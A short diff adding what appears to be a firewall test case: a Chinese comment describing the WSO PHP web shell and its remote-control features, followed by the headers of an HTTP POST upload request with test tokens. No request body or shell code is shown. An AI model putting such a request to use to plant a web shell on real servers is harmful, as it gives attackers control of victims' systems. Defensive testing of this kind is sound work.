@@ -1,0 +1,10 @@
+# webshell_WSO_php
+# 一个基于 PHP 编写的 Web Shell 工具，通常被用于远程控制受感染的服务器或网站。WSO Shell 具有许多功能，包括文件管理、执行命令、上传和下载文件等，使得攻击者可以在受感染的服务器上执行各种操作。
+POST /?bid=hd_tag_m8mv2484 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2484
+RM-PRO-Token: 9160d9017c09ea6dcc12aa0b83534c55
+RM-PRO-Time: 1742808368278
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=E6VoUeSp9HC9e2OVHGqAdXuPTlo-udn8
+
